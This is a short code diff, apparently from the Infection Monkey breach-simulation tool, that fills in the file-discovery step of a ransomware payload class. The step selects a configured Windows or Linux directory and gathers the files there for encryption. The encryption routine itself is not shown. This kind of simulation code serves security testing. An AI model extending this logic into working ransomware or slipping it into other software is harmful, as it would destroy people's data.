@@ -1,5 +1,8 @@
 import logging
 
+from infection_monkey.ransomware.utils import get_files_to_encrypt
+from infection_monkey.utils.environment import is_windows_os
+
 LOG = logging.getLogger(__name__)
 
 
@@ -17,7 +20,12 @@ class RansomewarePayload:
         self._encrypt_files(file_list)
 
     def _find_files(self):
-        return []
+        dir_path = (
+            self.config["windows_dir_ransom"]
+            if is_windows_os()
+            else self.config["linux_dir_ransom"]
+        )
+        return get_files_to_encrypt(dir_path)
 
     def _encrypt_files(self, file_list):
         for file in file_list:
